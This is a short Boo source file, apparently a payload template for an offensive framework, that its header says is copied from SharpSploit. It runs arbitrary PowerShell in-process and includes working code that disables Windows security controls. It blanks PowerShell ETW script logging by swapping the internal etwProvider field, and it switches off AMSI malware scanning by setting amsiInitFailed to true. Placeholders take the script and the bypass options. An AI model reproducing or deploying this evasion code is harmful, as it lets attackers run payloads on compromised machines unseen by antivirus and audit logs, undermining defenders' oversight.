/*

Stolen from SharpSploit 
    - https://github.com/cobbr/SharpSploit/blob/871ab3ee664e87cdc400a53f804096d206ef559c/SharpSploit/Execution/Shell.cs#L32
*/ 

import System
import System.Reflection
import System.Diagnostics
import System.Management.Automation

public static def PowerShellExecute(PowerShellCode as string, OutString as bool, BypassLogging as bool, BypassAmsi as bool) as string:
    using ps = PowerShell.Create():
        flags = BindingFlags.NonPublic | BindingFlags.Static
        if BypassLogging:
            PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
            if PSEtwLogProvider is not null:
                EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags)
                EventProvider = Eventing.EventProvider(Guid.NewGuid())
                EtwProvider.SetValue(null, EventProvider)

        if BypassAmsi:
            amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils")
            if amsiUtils is not null:
                amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true)

        ps.AddScript(PowerShellCode)
        if OutString:
            ps.AddCommand("Out-String")
        results = ps.Invoke()
        output = [R.ToString().Trim() as string for R in results]
        for R in output:
            print R

        ps.Commands.Clear()
        #return output

public static def Main():
    PowerShellExecute(
        PowerShellCode=`POWERSHELL_SCRIPT`,
        OutString=OUT_STRING,
        BypassLogging=BYPASS_LOGGING,
        BypassAmsi=BYPASS_AMSI
    )
